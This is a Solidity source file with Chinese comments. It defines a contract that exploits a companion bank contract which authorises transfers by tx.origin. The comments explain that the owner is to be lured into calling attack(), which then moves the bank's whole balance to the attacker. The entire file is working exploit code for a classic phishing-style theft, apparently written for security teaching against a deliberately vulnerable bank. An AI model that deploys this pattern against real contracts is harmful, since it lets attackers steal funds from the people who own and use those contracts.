// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./TxOriginBank.sol";

/**
 * 攻击者合约：针对使用 tx.origin 判断权限的合约发起攻击
 */
contract TxOriginAttack {
    TxOriginBank public bank;
    address payable public attacker;

    constructor(address _bankAddress) {
        bank = TxOriginBank(_bankAddress);
        attacker = payable(msg.sender);
    }

    // 诱导 Owner 调用该函数
    function attack() public {
        // 这里不是 owner 也行，只要 tx.origin 是 owner
        bank.transferAll(attacker);
    }
}
